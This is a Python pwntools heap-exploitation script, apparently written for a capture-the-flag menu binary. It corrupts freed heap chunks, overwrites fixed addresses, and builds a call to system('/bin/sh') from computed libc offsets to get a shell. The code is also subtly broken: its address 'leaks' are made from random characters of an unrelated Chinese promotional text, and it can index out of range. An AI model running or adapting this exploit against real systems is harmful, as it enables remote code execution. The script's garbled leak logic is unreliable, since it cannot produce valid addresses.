# coding=utf-8
from pwn import *
from random import *

strings = "上世纪的大上海灯红酒绿物欲横流人声鼎沸车水马龙宛如一座光怪陆离的奢靡天堂这里美女如云名流士族们在为搏美人一笑不惜一掷千金然而你也许想不到上海滩男人们真正的“梦中情人竟由这样一群老爷们打转载声明作者日本设计小站链接来源特品特惠著作权归作者所有商业转载请联系作者获得授权非商业转载请注明出处"


def method11(ip, port):
    global r
    r = remote(ip, port)
    log.info("Method 11 applied!")
    pwn()


def menu():
    pass


def create(pos, size, payload):
    menu()
    r.sendline("1")
    r.sendline(str(pos))
    r.sendline(str(size))
    r.sendline(payload)


def edit(payload):
    menu()
    r.sendline("2")
    r.sendline(payload)
    data = r.recvline()
    return data


def view(num):
    menu()
    r.sendline("3")
    r.sendline(str(num))
    data = r.recvline()
    return data


def delete(num):
    menu()
    r.sendline("4")
    r.sendline(str(num))


def change(pwd, payload):
    menu()
    r.sendline("5")
    r.sendline(pwd)
    r.sendline("soez")
    r.sendline(payload)
    r.recvline()


def quit():
    menu()
    r.sendline("6")


def pwn():
    r.sendline("soez")
    r.sendline("y")
    r.sendline("AAAA")

    create(0, 0x20, "")
    create(1, 0x20, "")
    delete(1)
    delete(0)
    create(0, 0x20, "")
    change("AAAA", p64(0) + p64(0x31) + p64(0) * 2 + "\xfc")
    edit(p64(0) * 5 + p64(0x31) + p64(0x602a40))
    create(1, 0x20, "")
    create(2, 0x20, "")
    edit(p64(0) * 2 + p64(0xfc) * 2)
    edit(p64(0) * 2 + p64(0xfc) * 2 + p64(0x602a98) + p64(0x603010) + p64(0x602a50))
    p_stack = u64((strings[randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
        randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
                       randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
                       randint(0, len(strings))]).ljust(8, '\0'))
    p_ret = p_stack + 0x58
    edit(p64(0) * 2 + p64(0xfc) * 2 + p64(0x603010) + p64(0x603040) + p64(p_ret))
    p_libc = u64((strings[randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
        randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
                       randint(0, len(strings))] + strings[randint(0, len(strings))] + strings[
                       randint(0, len(strings))]).ljust(8, '\0'))
    base_libc = p_libc - 0x20830
    p_bin_sh = base_libc + 0x18c58b
    p_system = base_libc + 0x45380
    edit(p64(0x401263) + p64(p_bin_sh) + p64(p_system))
    quit()

if __name__=="__main__":
    method11("127.0.0.1",80)